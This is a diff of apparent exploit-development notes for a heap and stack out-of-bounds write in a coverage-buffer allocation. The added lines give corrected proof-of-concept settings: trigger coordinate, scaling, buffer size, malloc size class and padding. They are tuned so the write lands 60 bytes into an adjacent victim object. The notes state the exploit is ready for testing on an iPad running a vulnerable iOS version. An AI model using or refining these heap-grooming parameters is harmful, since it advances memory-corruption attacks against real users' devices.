@@ -15,13 +15,19 @@ Coverage buffer allocation:
   if width_px > 1015: malloc(buffer_size)  ← HEAP OOB
   else:               alloca(buffer_size)  ← STACK OOB
 
-Current PoC settings:
-  DX = 33, N = 9 composite levels, SCALE ≈ 2.0
-  width_px ≈ DX * 2^N = 33 * 512 = 16,896
-  buffer_size ≈ 4 * (16896 + 16) = 67,648 bytes (~66 KB)
+Corrected PoC settings (v2):
+  N = 10, DX = 17, TX = 16409
+  width_px = int(17 * SCALE^10 * 1024/16384) = 1087
+  buffer_size = 4 * (1087 + 16) = 4412 bytes
+  malloc quantum = 5120 bytes (SMALL bin), padding = 708 bytes
+  OOB = +768 bytes past buffer → +60 bytes into NEXT allocation
 
 OOB write type: 16-bit increment on two adjacent 16-bit values
-OOB offset: controlled via trigger point x-coordinate and scaling chain
+OOB offset: TX=16409 → trig_px=1279, oob_px=192, oob_bytes=768
+  768 - 708 (padding) = 60 bytes into adjacent victim object
+
+Confirmed on macOS 27.0.1 (PATCHED): no OOB, clean exit
+Ready for testing on iPad Mini (iOS 27.0.1, VULNERABLE)
 ```
 
 ## 2. Size Class Targeting
